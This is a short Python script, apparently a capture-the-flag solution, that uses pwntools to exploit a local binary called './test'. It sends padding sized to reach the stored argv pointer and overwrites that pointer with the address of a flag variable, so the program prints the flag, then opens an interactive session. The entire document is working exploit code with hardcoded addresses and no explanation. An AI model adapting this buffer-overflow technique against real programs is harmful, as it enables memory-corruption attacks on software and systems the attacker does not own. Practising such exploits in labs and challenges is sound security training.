from pwn import *
context(arch = 'amd64', os = 'linux')

sh = process("./test")
argv_addr = 0x7fffffffdf28
name_addr = 0x7fffffffde10
another_flag_addr = 0x6010E0
payload = 'a' * (argv_addr - name_addr)+p64(another_flag_addr)
sh.sendafter("=v=.\n", payload)
sh.interactive()
